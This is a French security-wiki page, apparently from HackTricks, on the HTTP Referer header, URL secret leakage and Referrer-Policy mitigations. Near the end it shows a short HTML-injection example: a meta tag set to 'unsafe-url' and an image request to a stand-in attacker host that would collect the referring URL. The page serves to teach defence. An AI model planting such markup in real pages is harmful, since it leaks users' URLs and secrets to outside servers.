# Comportement HTTP intéressant

{{#include ../banners/hacktricks-training.md}}

## En-tête `Referer` et politique de referrer

L'en-tête de requête HTTP `Referer` identifie l'URL absolue ou partielle depuis laquelle une ressource a été demandée. Selon la politique de referrer active, il peut inclure l'origine, le chemin et la chaîne de requête de référence, mais pas le fragment d'URL.<sup>[[1]](#references)</sup>

### Leak d'informations sensibles

Les secrets présents dans les chemins d'URL ou les paramètres de requête peuvent fuiter via l'historique du navigateur, les logs, les outils d'analytics, les liens copiés et l'en-tête `Referer`. Un lien cross-origin ou une requête vers une sous-ressource peut donc divulguer l'URL de référence à un serveur externe.<sup>[[2]](#references)</sup>

### Atténuation

Utilisez l'en-tête de réponse `Referrer-Policy` pour contrôler la quantité d'informations de referrer envoyée par le navigateur. `strict-origin-when-cross-origin` est la valeur par défaut moderne des navigateurs, tandis que `no-referrer` supprime entièrement l'en-tête ; choisissez la politique qui correspond aux exigences de l'application.<sup>[[3]](#references)</sup>
```http
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
Ne placez pas de mots de passe, d’identifiants de session, de clés API ou d’autres valeurs sensibles dans les URLs. Envoyez-les plutôt dans des en-têtes ou des corps de requête appropriés via TLS.<sup>[[2]](#references)</sup>

### Considérations relatives à l’injection HTML

Un document peut également définir une policy applicable à toute la page avec `<meta name="referrer">`. Si une faille d’injection HTML permet à un attaquant d’insérer un élément meta effectif, celui-ci peut tenter d’affaiblir la policy du document pour les requêtes ultérieures. Les policies meta injectées dynamiquement ou contradictoires peuvent se comporter de manière imprévisible. Vérifiez donc le comportement dans le navigateur cible au lieu de supposer que l’en-tête de réponse est toujours remplacé.<sup>[[4]](#references)</sup>
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.example/collect" alt="">
```
Corrigez l'injection HTML sous-jacente et gardez les données sensibles hors de l'URL ; une politique de referrer est une défense en profondeur, et non un substitut à l'un ou l'autre de ces contrôles.

## References

- [1] [MDN - en-tête `Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer)
- [2] [MITRE CWE-598 - Utilisation de la méthode de requête GET avec des chaînes de requête sensibles](https://cwe.mitre.org/data/definitions/598.html)
- [3] [MDN - en-tête `Referrer-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy)
- [4] [MDN - `<meta name="referrer">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/name/referrer)
{{#include ../banners/hacktricks-training.md}}
